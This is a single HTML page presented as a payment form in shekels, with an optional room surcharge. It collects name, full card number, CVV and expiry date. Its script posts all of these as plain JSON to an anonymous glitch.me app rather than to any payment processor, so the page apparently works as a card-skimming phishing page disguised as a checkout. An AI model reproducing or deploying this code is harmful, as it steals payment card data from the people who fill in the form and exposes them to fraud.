<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Method</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 400px;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }

        input[type="text"], select {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.3s ease;
        }

        input[type="text"]:focus, select:focus {
            border-color: #007BFF;
            outline: none;
        }

        .field-group {
            display: flex;
            gap: 10px;
        }

        .field-group select {
            width: 48%;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }
            .field-group {
                flex-direction: column;
            }
            .field-group select {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Payment</h1>
        <label for="money">How much do you want to pay?</label>
        <select id="money">
            <option value="">Select payment</option>
            <option value="250">250₪</option>
            <option value="300">300₪</option>
            <option value="500">500₪</option>
        </select>

        <label for="payment-option">Choose with or without room (+100₪)</label>
        <select id="payment-option">
            <option value="without">Without</option>
            <option value="with">With</option>
        </select>

        <label for="first-name">First Name:</label>
        <input type="text" id="first-name" placeholder="Enter First Name">

        <label for="last-name">Last Name:</label>
        <input type="text" id="last-name" placeholder="Enter Last Name">

        <label for="card-number">Card Number (PAN)</label>
        <input type="text" id="card-number" maxlength="16" placeholder="16-digit card number">

        <label for="cvv">CVV</label>
        <input type="text" id="cvv" maxlength="3" placeholder="3-digit CVV" oninput="validateCVV()">

        <label for="expiration-date">Expiration Date</label>
        <div class="field-group">
            <select id="month">
                <option value="">Month</option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
            </select>

            <select id="year">
                <option value="">Year</option>
                <script>
                    for (let year = 2025; year <= 2060; year++) {
                        document.write(`<option value="${year}">${year}</option>`);
                    }
                </script>
            </select>
        </div>

        <button onclick="saveToServer()">Pay</button>
    </div>

    <script>
        function validateCVV() {
            let cvv = document.getElementById("cvv");
            cvv.value = cvv.value.substring(0, 3);
        }

        function validateForm() {
            let firstName = document.getElementById("first-name").value;
            let lastName = document.getElementById("last-name").value;
            let cardNumber = document.getElementById("card-number").value;
            let cvv = document.getElementById("cvv").value;
            let month = document.getElementById("month").value;
            let year = document.getElementById("year").value;

            if (!firstName || !lastName || !cardNumber || !cvv || !month || !year) {
                alert("All fields must be filled out.");
                return false;
            }
            if (cardNumber.length !== 16) {
                alert("Card number must be exactly 16 digits.");
                return false;
            }
            return true;
        }

        function saveToServer() {
            if (!validateForm()) return;

            let data = {
                firstName: document.getElementById("first-name").value,
                lastName: document.getElementById("last-name").value,
                cardNumber: document.getElementById("card-number").value,
                cvv: document.getElementById("cvv").value,
                expirationDate: {
                    month: document.getElementById("month").value,
                    year: document.getElementById("year").value
                }
            };

            fetch("https://dirt-toothsome-saga.glitch.me/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            })
            .then(response => response.text())
            .then(data => alert(data))
            .catch(error => console.error("Error:", error));
        }
    </script>
</body>
</html>
